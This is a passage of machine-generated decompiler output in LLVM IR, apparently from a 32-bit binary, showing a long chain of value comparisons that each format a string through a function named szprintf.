  br i1 %v3_10005c7c, label %dec_label_pc_10005c84, label %dec_label_pc_10005ccc

dec_label_pc_10005c84:                            ; preds = %dec_label_pc_10005c78
  %v2_10005c84 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005c98 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005c98 = zext i8 %v3_10005c98 to i32
  %v4_10005cc8 = call i32 @szprintf(i32 %v2_10005c84, i32 ptrtoint ([14 x i8]* @global_var_100157f8.174 to i32), i32 %v4_10005c98)
  br label %dec_label_pc_10005ccc

dec_label_pc_10005ccc:                            ; preds = %dec_label_pc_10005c78, %dec_label_pc_10005c84
  %v3_10005cd0 = icmp eq i32 %v2_10003364, 126
  br i1 %v3_10005cd0, label %dec_label_pc_10005cd8, label %dec_label_pc_10005d20

dec_label_pc_10005cd8:                            ; preds = %dec_label_pc_10005ccc
  %v2_10005cd8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005cec = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005cec = zext i8 %v3_10005cec to i32
  %v4_10005d1c = call i32 @szprintf(i32 %v2_10005cd8, i32 ptrtoint ([14 x i8]* @global_var_100157e8.173 to i32), i32 %v4_10005cec)
  br label %dec_label_pc_10005d20

dec_label_pc_10005d20:                            ; preds = %dec_label_pc_10005ccc, %dec_label_pc_10005cd8
  %v3_10005d24 = icmp eq i32 %v2_10003364, 127
  br i1 %v3_10005d24, label %dec_label_pc_10005d2c, label %dec_label_pc_10005d74

dec_label_pc_10005d2c:                            ; preds = %dec_label_pc_10005d20
  %v2_10005d2c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d40 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005d40 = zext i8 %v3_10005d40 to i32
  %v4_10005d70 = call i32 @szprintf(i32 %v2_10005d2c, i32 ptrtoint ([14 x i8]* @global_var_10015808.175 to i32), i32 %v4_10005d40)
  br label %dec_label_pc_10005d74

dec_label_pc_10005d74:                            ; preds = %dec_label_pc_10005d20, %dec_label_pc_10005d2c
  %v3_10005d78 = icmp eq i32 %v2_10003364, 128
  br i1 %v3_10005d78, label %dec_label_pc_10005d80, label %dec_label_pc_10005dc8

dec_label_pc_10005d80:                            ; preds = %dec_label_pc_10005d74
  %v2_10005d80 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005d94 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005d94 = zext i8 %v3_10005d94 to i32
  %v4_10005dc4 = call i32 @szprintf(i32 %v2_10005d80, i32 ptrtoint ([14 x i8]* @global_var_10015818.176 to i32), i32 %v4_10005d94)
  br label %dec_label_pc_10005dc8

dec_label_pc_10005dc8:                            ; preds = %dec_label_pc_10005d74, %dec_label_pc_10005d80
  %v3_10005dcc = icmp eq i32 %v2_10003364, 129
  br i1 %v3_10005dcc, label %dec_label_pc_10005dd4, label %dec_label_pc_10005e1c

dec_label_pc_10005dd4:                            ; preds = %dec_label_pc_10005dc8
  %v2_10005dd4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005de8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005de8 = zext i8 %v3_10005de8 to i32
  %v4_10005e18 = call i32 @szprintf(i32 %v2_10005dd4, i32 ptrtoint ([14 x i8]* @global_var_10015828.177 to i32), i32 %v4_10005de8)
  br label %dec_label_pc_10005e1c

dec_label_pc_10005e1c:                            ; preds = %dec_label_pc_10005dc8, %dec_label_pc_10005dd4
  %v3_10005e20 = icmp eq i32 %v2_10003364, 130
  br i1 %v3_10005e20, label %dec_label_pc_10005e28, label %dec_label_pc_10005e70

dec_label_pc_10005e28:                            ; preds = %dec_label_pc_10005e1c
  %v2_10005e28 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e3c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005e3c = zext i8 %v3_10005e3c to i32
  %v4_10005e6c = call i32 @szprintf(i32 %v2_10005e28, i32 ptrtoint ([14 x i8]* @global_var_10015838.178 to i32), i32 %v4_10005e3c)
  br label %dec_label_pc_10005e70

dec_label_pc_10005e70:                            ; preds = %dec_label_pc_10005e1c, %dec_label_pc_10005e28
  %v3_10005e74 = icmp eq i32 %v2_10003364, 131
  br i1 %v3_10005e74, label %dec_label_pc_10005e7c, label %dec_label_pc_10005ec4

dec_label_pc_10005e7c:                            ; preds = %dec_label_pc_10005e70
  %v2_10005e7c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005e90 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005e90 = zext i8 %v3_10005e90 to i32
  %v4_10005ec0 = call i32 @szprintf(i32 %v2_10005e7c, i32 ptrtoint ([14 x i8]* @global_var_10015848.179 to i32), i32 %v4_10005e90)
  br label %dec_label_pc_10005ec4

dec_label_pc_10005ec4:                            ; preds = %dec_label_pc_10005e70, %dec_label_pc_10005e7c
  %v3_10005ec8 = icmp eq i32 %v2_10003364, 132
  br i1 %v3_10005ec8, label %dec_label_pc_10005ed0, label %dec_label_pc_10005f18

dec_label_pc_10005ed0:                            ; preds = %dec_label_pc_10005ec4
  %v2_10005ed0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005ee4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005ee4 = zext i8 %v3_10005ee4 to i32
  %v4_10005f14 = call i32 @szprintf(i32 %v2_10005ed0, i32 ptrtoint ([14 x i8]* @global_var_10015858.180 to i32), i32 %v4_10005ee4)
  br label %dec_label_pc_10005f18

dec_label_pc_10005f18:                            ; preds = %dec_label_pc_10005ec4, %dec_label_pc_10005ed0
  %v3_10005f1c = icmp eq i32 %v2_10003364, 133
  br i1 %v3_10005f1c, label %dec_label_pc_10005f24, label %dec_label_pc_10005f6c

dec_label_pc_10005f24:                            ; preds = %dec_label_pc_10005f18
  %v2_10005f24 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f38 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005f38 = zext i8 %v3_10005f38 to i32
  %v4_10005f68 = call i32 @szprintf(i32 %v2_10005f24, i32 ptrtoint ([14 x i8]* @global_var_10015868.181 to i32), i32 %v4_10005f38)
  br label %dec_label_pc_10005f6c

dec_label_pc_10005f6c:                            ; preds = %dec_label_pc_10005f18, %dec_label_pc_10005f24
  %v3_10005f70 = icmp eq i32 %v2_10003364, 134
  br i1 %v3_10005f70, label %dec_label_pc_10005f78, label %dec_label_pc_10005fc0

dec_label_pc_10005f78:                            ; preds = %dec_label_pc_10005f6c
  %v2_10005f78 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005f8c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005f8c = zext i8 %v3_10005f8c to i32
  %v4_10005fbc = call i32 @szprintf(i32 %v2_10005f78, i32 ptrtoint ([14 x i8]* @global_var_10015878.182 to i32), i32 %v4_10005f8c)
  br label %dec_label_pc_10005fc0

dec_label_pc_10005fc0:                            ; preds = %dec_label_pc_10005f6c, %dec_label_pc_10005f78
  %v3_10005fc4 = icmp eq i32 %v2_10003364, 135
  br i1 %v3_10005fc4, label %dec_label_pc_10005fcc, label %dec_label_pc_10006014

dec_label_pc_10005fcc:                            ; preds = %dec_label_pc_10005fc0
  %v2_10005fcc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005fe0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10005fe0 = zext i8 %v3_10005fe0 to i32
  %v4_10006010 = call i32 @szprintf(i32 %v2_10005fcc, i32 ptrtoint ([14 x i8]* @global_var_10015888.183 to i32), i32 %v4_10005fe0)
  br label %dec_label_pc_10006014

dec_label_pc_10006014:                            ; preds = %dec_label_pc_10005fc0, %dec_label_pc_10005fcc
  %v3_10006018 = icmp eq i32 %v2_10003364, 136
  br i1 %v3_10006018, label %dec_label_pc_10006020, label %dec_label_pc_10006068

dec_label_pc_10006020:                            ; preds = %dec_label_pc_10006014
  %v2_10006020 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006034 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006034 = zext i8 %v3_10006034 to i32
  %v4_10006064 = call i32 @szprintf(i32 %v2_10006020, i32 ptrtoint ([14 x i8]* @global_var_10015898.184 to i32), i32 %v4_10006034)
  br label %dec_label_pc_10006068

dec_label_pc_10006068:                            ; preds = %dec_label_pc_10006014, %dec_label_pc_10006020
  %v3_1000606c = icmp eq i32 %v2_10003364, 137
  br i1 %v3_1000606c, label %dec_label_pc_10006074, label %dec_label_pc_100060bc

dec_label_pc_10006074:                            ; preds = %dec_label_pc_10006068
  %v2_10006074 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006088 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006088 = zext i8 %v3_10006088 to i32
  %v4_100060b8 = call i32 @szprintf(i32 %v2_10006074, i32 ptrtoint ([13 x i8]* @global_var_100158a8.185 to i32), i32 %v4_10006088)
  br label %dec_label_pc_100060bc

dec_label_pc_100060bc:                            ; preds = %dec_label_pc_10006068, %dec_label_pc_10006074
  %v3_100060c0 = icmp eq i32 %v2_10003364, 138
  br i1 %v3_100060c0, label %dec_label_pc_100060c8, label %dec_label_pc_10006110

dec_label_pc_100060c8:                            ; preds = %dec_label_pc_100060bc
  %v2_100060c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100060dc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100060dc = zext i8 %v3_100060dc to i32
  %v4_1000610c = call i32 @szprintf(i32 %v2_100060c8, i32 ptrtoint ([13 x i8]* @global_var_100158b8.186 to i32), i32 %v4_100060dc)
  br label %dec_label_pc_10006110

dec_label_pc_10006110:                            ; preds = %dec_label_pc_100060bc, %dec_label_pc_100060c8
  %v3_10006114 = icmp eq i32 %v2_10003364, 139
  br i1 %v3_10006114, label %dec_label_pc_1000611c, label %dec_label_pc_10006164

dec_label_pc_1000611c:                            ; preds = %dec_label_pc_10006110
  %v2_1000611c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006130 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006130 = zext i8 %v3_10006130 to i32
  %v4_10006160 = call i32 @szprintf(i32 %v2_1000611c, i32 ptrtoint ([13 x i8]* @global_var_100158c8.187 to i32), i32 %v4_10006130)
  br label %dec_label_pc_10006164

dec_label_pc_10006164:                            ; preds = %dec_label_pc_10006110, %dec_label_pc_1000611c
  %v3_10006168 = icmp eq i32 %v2_10003364, 140
  br i1 %v3_10006168, label %dec_label_pc_10006170, label %dec_label_pc_100061b8

dec_label_pc_10006170:                            ; preds = %dec_label_pc_10006164
  %v2_10006170 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006184 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006184 = zext i8 %v3_10006184 to i32
  %v4_100061b4 = call i32 @szprintf(i32 %v2_10006170, i32 ptrtoint ([13 x i8]* @global_var_100158d8.188 to i32), i32 %v4_10006184)
  br label %dec_label_pc_100061b8

dec_label_pc_100061b8:                            ; preds = %dec_label_pc_10006164, %dec_label_pc_10006170
  %v3_100061bc = icmp eq i32 %v2_10003364, 141
  br i1 %v3_100061bc, label %dec_label_pc_100061c4, label %dec_label_pc_1000620c

dec_label_pc_100061c4:                            ; preds = %dec_label_pc_100061b8
  %v2_100061c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100061d8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100061d8 = zext i8 %v3_100061d8 to i32
  %v4_10006208 = call i32 @szprintf(i32 %v2_100061c4, i32 ptrtoint ([13 x i8]* @global_var_100158e8.189 to i32), i32 %v4_100061d8)
  br label %dec_label_pc_1000620c

dec_label_pc_1000620c:                            ; preds = %dec_label_pc_100061b8, %dec_label_pc_100061c4
  %v3_10006210 = icmp eq i32 %v2_10003364, 142
  br i1 %v3_10006210, label %dec_label_pc_10006218, label %dec_label_pc_10006260

dec_label_pc_10006218:                            ; preds = %dec_label_pc_1000620c
  %v2_10006218 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000622c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000622c = zext i8 %v3_1000622c to i32
  %v4_1000625c = call i32 @szprintf(i32 %v2_10006218, i32 ptrtoint ([13 x i8]* @global_var_100158f8.190 to i32), i32 %v4_1000622c)
  br label %dec_label_pc_10006260

dec_label_pc_10006260:                            ; preds = %dec_label_pc_1000620c, %dec_label_pc_10006218
  %v3_10006264 = icmp eq i32 %v2_10003364, 143
  br i1 %v3_10006264, label %dec_label_pc_1000626c, label %dec_label_pc_100062b4

dec_label_pc_1000626c:                            ; preds = %dec_label_pc_10006260
  %v2_1000626c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006280 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006280 = zext i8 %v3_10006280 to i32
  %v4_100062b0 = call i32 @szprintf(i32 %v2_1000626c, i32 ptrtoint ([14 x i8]* @global_var_100157e8.173 to i32), i32 %v4_10006280)
  br label %dec_label_pc_100062b4

dec_label_pc_100062b4:                            ; preds = %dec_label_pc_10006260, %dec_label_pc_1000626c
  %v3_100062b8 = icmp eq i32 %v2_10003364, 144
  br i1 %v3_100062b8, label %dec_label_pc_100062c0, label %dec_label_pc_10006308

dec_label_pc_100062c0:                            ; preds = %dec_label_pc_100062b4
  %v2_100062c0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100062d4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100062d4 = zext i8 %v3_100062d4 to i32
  %v4_10006304 = call i32 @szprintf(i32 %v2_100062c0, i32 ptrtoint ([14 x i8]* @global_var_10015908.191 to i32), i32 %v4_100062d4)
  br label %dec_label_pc_10006308

dec_label_pc_10006308:                            ; preds = %dec_label_pc_100062b4, %dec_label_pc_100062c0
  %v3_1000630c = icmp eq i32 %v2_10003364, 145
  br i1 %v3_1000630c, label %dec_label_pc_10006314, label %dec_label_pc_1000635c

dec_label_pc_10006314:                            ; preds = %dec_label_pc_10006308
  %v2_10006314 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006328 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006328 = zext i8 %v3_10006328 to i32
  %v4_10006358 = call i32 @szprintf(i32 %v2_10006314, i32 ptrtoint ([14 x i8]* @global_var_10015918.192 to i32), i32 %v4_10006328)
  br label %dec_label_pc_1000635c

dec_label_pc_1000635c:                            ; preds = %dec_label_pc_10006308, %dec_label_pc_10006314
  %v3_10006360 = icmp eq i32 %v2_10003364, 146
  br i1 %v3_10006360, label %dec_label_pc_10006368, label %dec_label_pc_100063b0

dec_label_pc_10006368:                            ; preds = %dec_label_pc_1000635c
  %v2_10006368 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000637c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000637c = zext i8 %v3_1000637c to i32
  %v4_100063ac = call i32 @szprintf(i32 %v2_10006368, i32 ptrtoint ([14 x i8]* @global_var_10015928.193 to i32), i32 %v4_1000637c)
  br label %dec_label_pc_100063b0

dec_label_pc_100063b0:                            ; preds = %dec_label_pc_1000635c, %dec_label_pc_10006368
  %v3_100063b4 = icmp eq i32 %v2_10003364, 147
  br i1 %v3_100063b4, label %dec_label_pc_100063bc, label %dec_label_pc_10006404

dec_label_pc_100063bc:                            ; preds = %dec_label_pc_100063b0
  %v2_100063bc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100063d0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100063d0 = zext i8 %v3_100063d0 to i32
  %v4_10006400 = call i32 @szprintf(i32 %v2_100063bc, i32 ptrtoint ([13 x i8]* @global_var_10015938.194 to i32), i32 %v4_100063d0)
  br label %dec_label_pc_10006404

dec_label_pc_10006404:                            ; preds = %dec_label_pc_100063b0, %dec_label_pc_100063bc
  %v3_10006408 = icmp eq i32 %v2_10003364, 148
  br i1 %v3_10006408, label %dec_label_pc_10006410, label %dec_label_pc_10006458

dec_label_pc_10006410:                            ; preds = %dec_label_pc_10006404
  %v2_10006410 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006424 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006424 = zext i8 %v3_10006424 to i32
  %v4_10006454 = call i32 @szprintf(i32 %v2_10006410, i32 ptrtoint ([14 x i8]* @global_var_10015948.195 to i32), i32 %v4_10006424)
  br label %dec_label_pc_10006458

dec_label_pc_10006458:                            ; preds = %dec_label_pc_10006404, %dec_label_pc_10006410
  %v3_1000645c = icmp eq i32 %v2_10003364, 149
  br i1 %v3_1000645c, label %dec_label_pc_10006464, label %dec_label_pc_100064ac

dec_label_pc_10006464:                            ; preds = %dec_label_pc_10006458
  %v2_10006464 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006478 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006478 = zext i8 %v3_10006478 to i32
  %v4_100064a8 = call i32 @szprintf(i32 %v2_10006464, i32 ptrtoint ([14 x i8]* @global_var_10015958.196 to i32), i32 %v4_10006478)
  br label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_10006458, %dec_label_pc_10006464
  %v3_100064b0 = icmp eq i32 %v2_10003364, 150
  br i1 %v3_100064b0, label %dec_label_pc_100064b8, label %dec_label_pc_10006500

dec_label_pc_100064b8:                            ; preds = %dec_label_pc_100064ac
  %v2_100064b8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100064cc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100064cc = zext i8 %v3_100064cc to i32
  %v4_100064fc = call i32 @szprintf(i32 %v2_100064b8, i32 ptrtoint ([14 x i8]* @global_var_10015968.197 to i32), i32 %v4_100064cc)
  br label %dec_label_pc_10006500

dec_label_pc_10006500:                            ; preds = %dec_label_pc_100064ac, %dec_label_pc_100064b8
  %v3_10006504 = icmp eq i32 %v2_10003364, 151
  br i1 %v3_10006504, label %dec_label_pc_1000650c, label %dec_label_pc_10006554

dec_label_pc_1000650c:                            ; preds = %dec_label_pc_10006500
  %v2_1000650c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006520 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006520 = zext i8 %v3_10006520 to i32
  %v4_10006550 = call i32 @szprintf(i32 %v2_1000650c, i32 ptrtoint ([14 x i8]* @global_var_10015978.198 to i32), i32 %v4_10006520)
  br label %dec_label_pc_10006554

dec_label_pc_10006554:                            ; preds = %dec_label_pc_10006500, %dec_label_pc_1000650c
  %v3_10006558 = icmp eq i32 %v2_10003364, 152
  br i1 %v3_10006558, label %dec_label_pc_10006560, label %dec_label_pc_100065a8

dec_label_pc_10006560:                            ; preds = %dec_label_pc_10006554
  %v2_10006560 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006574 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006574 = zext i8 %v3_10006574 to i32
  %v4_100065a4 = call i32 @szprintf(i32 %v2_10006560, i32 ptrtoint ([14 x i8]* @global_var_1001575c.164 to i32), i32 %v4_10006574)
  br label %dec_label_pc_100065a8

dec_label_pc_100065a8:                            ; preds = %dec_label_pc_10006554, %dec_label_pc_10006560
  %v3_100065ac = icmp eq i32 %v2_10003364, 153
  br i1 %v3_100065ac, label %dec_label_pc_100065b4, label %dec_label_pc_100065fc

dec_label_pc_100065b4:                            ; preds = %dec_label_pc_100065a8
  %v2_100065b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100065c8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100065c8 = zext i8 %v3_100065c8 to i32
  %v4_100065f8 = call i32 @szprintf(i32 %v2_100065b4, i32 ptrtoint ([13 x i8]* @global_var_10015988.199 to i32), i32 %v4_100065c8)
  br label %dec_label_pc_100065fc

dec_label_pc_100065fc:                            ; preds = %dec_label_pc_100065a8, %dec_label_pc_100065b4
  %v3_10006600 = icmp eq i32 %v2_10003364, 154
  br i1 %v3_10006600, label %dec_label_pc_10006608, label %dec_label_pc_10006650

dec_label_pc_10006608:                            ; preds = %dec_label_pc_100065fc
  %v2_10006608 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000661c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000661c = zext i8 %v3_1000661c to i32
  %v4_1000664c = call i32 @szprintf(i32 %v2_10006608, i32 ptrtoint ([13 x i8]* @global_var_10015998.200 to i32), i32 %v4_1000661c)
  br label %dec_label_pc_10006650

dec_label_pc_10006650:                            ; preds = %dec_label_pc_100065fc, %dec_label_pc_10006608
  %v3_10006654 = icmp eq i32 %v2_10003364, 155
  br i1 %v3_10006654, label %dec_label_pc_1000665c, label %dec_label_pc_100066a4

dec_label_pc_1000665c:                            ; preds = %dec_label_pc_10006650
  %v2_1000665c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006670 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006670 = zext i8 %v3_10006670 to i32
  %v4_100066a0 = call i32 @szprintf(i32 %v2_1000665c, i32 ptrtoint ([13 x i8]* @global_var_100159a8.201 to i32), i32 %v4_10006670)
  br label %dec_label_pc_100066a4

dec_label_pc_100066a4:                            ; preds = %dec_label_pc_10006650, %dec_label_pc_1000665c
  %v3_100066a8 = icmp eq i32 %v2_10003364, 156
  br i1 %v3_100066a8, label %dec_label_pc_100066b0, label %dec_label_pc_100066f8

dec_label_pc_100066b0:                            ; preds = %dec_label_pc_100066a4
  %v2_100066b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100066c4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100066c4 = zext i8 %v3_100066c4 to i32
  %v4_100066f4 = call i32 @szprintf(i32 %v2_100066b0, i32 ptrtoint ([13 x i8]* @global_var_100159b8.202 to i32), i32 %v4_100066c4)
  br label %dec_label_pc_100066f8

dec_label_pc_100066f8:                            ; preds = %dec_label_pc_100066a4, %dec_label_pc_100066b0
  %v3_100066fc = icmp eq i32 %v2_10003364, 157
  br i1 %v3_100066fc, label %dec_label_pc_10006704, label %dec_label_pc_1000674c

dec_label_pc_10006704:                            ; preds = %dec_label_pc_100066f8
  %v2_10006704 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006718 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006718 = zext i8 %v3_10006718 to i32
  %v4_10006748 = call i32 @szprintf(i32 %v2_10006704, i32 ptrtoint ([14 x i8]* @global_var_100159c8.203 to i32), i32 %v4_10006718)
  br label %dec_label_pc_1000674c

dec_label_pc_1000674c:                            ; preds = %dec_label_pc_100066f8, %dec_label_pc_10006704
  %v3_10006750 = icmp eq i32 %v2_10003364, 158
  br i1 %v3_10006750, label %dec_label_pc_10006758, label %dec_label_pc_100067a0

dec_label_pc_10006758:                            ; preds = %dec_label_pc_1000674c
  %v2_10006758 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000676c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000676c = zext i8 %v3_1000676c to i32
  %v4_1000679c = call i32 @szprintf(i32 %v2_10006758, i32 ptrtoint ([12 x i8]* @global_var_100159d8.204 to i32), i32 %v4_1000676c)
  br label %dec_label_pc_100067a0

dec_label_pc_100067a0:                            ; preds = %dec_label_pc_1000674c, %dec_label_pc_10006758
  %v3_100067a4 = icmp eq i32 %v2_10003364, 159
  br i1 %v3_100067a4, label %dec_label_pc_100067ac, label %dec_label_pc_100067f4

dec_label_pc_100067ac:                            ; preds = %dec_label_pc_100067a0
  %v2_100067ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100067c0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100067c0 = zext i8 %v3_100067c0 to i32
  %v4_100067f0 = call i32 @szprintf(i32 %v2_100067ac, i32 ptrtoint ([14 x i8]* @global_var_100159e4.205 to i32), i32 %v4_100067c0)
  br label %dec_label_pc_100067f4

dec_label_pc_100067f4:                            ; preds = %dec_label_pc_100067a0, %dec_label_pc_100067ac
  %v3_100067f8 = icmp eq i32 %v2_10003364, 160
  br i1 %v3_100067f8, label %dec_label_pc_10006800, label %dec_label_pc_10006848

dec_label_pc_10006800:                            ; preds = %dec_label_pc_100067f4
  %v2_10006800 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006814 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006814 = zext i8 %v3_10006814 to i32
  %v4_10006844 = call i32 @szprintf(i32 %v2_10006800, i32 ptrtoint ([13 x i8]* @global_var_100159f4.206 to i32), i32 %v4_10006814)
  br label %dec_label_pc_10006848

dec_label_pc_10006848:                            ; preds = %dec_label_pc_100067f4, %dec_label_pc_10006800
  %v3_1000684c = icmp eq i32 %v2_10003364, 161
  br i1 %v3_1000684c, label %dec_label_pc_10006854, label %dec_label_pc_1000689c

dec_label_pc_10006854:                            ; preds = %dec_label_pc_10006848
  %v2_10006854 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006868 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006868 = zext i8 %v3_10006868 to i32
  %v4_10006898 = call i32 @szprintf(i32 %v2_10006854, i32 ptrtoint ([14 x i8]* @global_var_10015a04.207 to i32), i32 %v4_10006868)
  br label %dec_label_pc_1000689c

dec_label_pc_1000689c:                            ; preds = %dec_label_pc_10006848, %dec_label_pc_10006854
  %v3_100068a0 = icmp eq i32 %v2_10003364, 162
  br i1 %v3_100068a0, label %dec_label_pc_100068a8, label %dec_label_pc_100068f0

dec_label_pc_100068a8:                            ; preds = %dec_label_pc_1000689c
  %v2_100068a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100068bc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100068bc = zext i8 %v3_100068bc to i32
  %v4_100068ec = call i32 @szprintf(i32 %v2_100068a8, i32 ptrtoint ([14 x i8]* @global_var_10015a14.208 to i32), i32 %v4_100068bc)
  br label %dec_label_pc_100068f0

dec_label_pc_100068f0:                            ; preds = %dec_label_pc_1000689c, %dec_label_pc_100068a8
  %v3_100068f4 = icmp eq i32 %v2_10003364, 163
  br i1 %v3_100068f4, label %dec_label_pc_100068fc, label %dec_label_pc_10006944

dec_label_pc_100068fc:                            ; preds = %dec_label_pc_100068f0
  %v2_100068fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006910 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006910 = zext i8 %v3_10006910 to i32
  %v4_10006940 = call i32 @szprintf(i32 %v2_100068fc, i32 ptrtoint ([14 x i8]* @global_var_10015a24.209 to i32), i32 %v4_10006910)
  br label %dec_label_pc_10006944

dec_label_pc_10006944:                            ; preds = %dec_label_pc_100068f0, %dec_label_pc_100068fc
  %v3_10006948 = icmp eq i32 %v2_10003364, 164
  br i1 %v3_10006948, label %dec_label_pc_10006950, label %dec_label_pc_10006998

dec_label_pc_10006950:                            ; preds = %dec_label_pc_10006944
  %v2_10006950 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006964 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006964 = zext i8 %v3_10006964 to i32
  %v4_10006994 = call i32 @szprintf(i32 %v2_10006950, i32 ptrtoint ([14 x i8]* @global_var_10015978.198 to i32), i32 %v4_10006964)
  br label %dec_label_pc_10006998

dec_label_pc_10006998:                            ; preds = %dec_label_pc_10006944, %dec_label_pc_10006950
  %v3_1000699c = icmp eq i32 %v2_10003364, 165
  br i1 %v3_1000699c, label %dec_label_pc_100069a4, label %dec_label_pc_100069ec

dec_label_pc_100069a4:                            ; preds = %dec_label_pc_10006998
  %v2_100069a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100069b8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100069b8 = zext i8 %v3_100069b8 to i32
  %v4_100069e8 = call i32 @szprintf(i32 %v2_100069a4, i32 ptrtoint ([14 x i8]* @global_var_10015a34.210 to i32), i32 %v4_100069b8)
  br label %dec_label_pc_100069ec

dec_label_pc_100069ec:                            ; preds = %dec_label_pc_10006998, %dec_label_pc_100069a4
  %v3_100069f0 = icmp eq i32 %v2_10003364, 166
  br i1 %v3_100069f0, label %dec_label_pc_100069f8, label %dec_label_pc_10006a40

dec_label_pc_100069f8:                            ; preds = %dec_label_pc_100069ec
  %v2_100069f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a0c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006a0c = zext i8 %v3_10006a0c to i32
  %v4_10006a3c = call i32 @szprintf(i32 %v2_100069f8, i32 ptrtoint ([14 x i8]* @global_var_10015a44.211 to i32), i32 %v4_10006a0c)
  br label %dec_label_pc_10006a40

dec_label_pc_10006a40:                            ; preds = %dec_label_pc_100069ec, %dec_label_pc_100069f8
  %v3_10006a44 = icmp eq i32 %v2_10003364, 167
  br i1 %v3_10006a44, label %dec_label_pc_10006a4c, label %dec_label_pc_10006a94

dec_label_pc_10006a4c:                            ; preds = %dec_label_pc_10006a40
  %v2_10006a4c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006a60 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006a60 = zext i8 %v3_10006a60 to i32
  %v4_10006a90 = call i32 @szprintf(i32 %v2_10006a4c, i32 ptrtoint ([14 x i8]* @global_var_100159e4.205 to i32), i32 %v4_10006a60)
  br label %dec_label_pc_10006a94

dec_label_pc_10006a94:                            ; preds = %dec_label_pc_10006a40, %dec_label_pc_10006a4c
  %v3_10006a98 = icmp eq i32 %v2_10003364, 168
  br i1 %v3_10006a98, label %dec_label_pc_10006aa0, label %dec_label_pc_10006ae8

dec_label_pc_10006aa0:                            ; preds = %dec_label_pc_10006a94
  %v2_10006aa0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ab4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006ab4 = zext i8 %v3_10006ab4 to i32
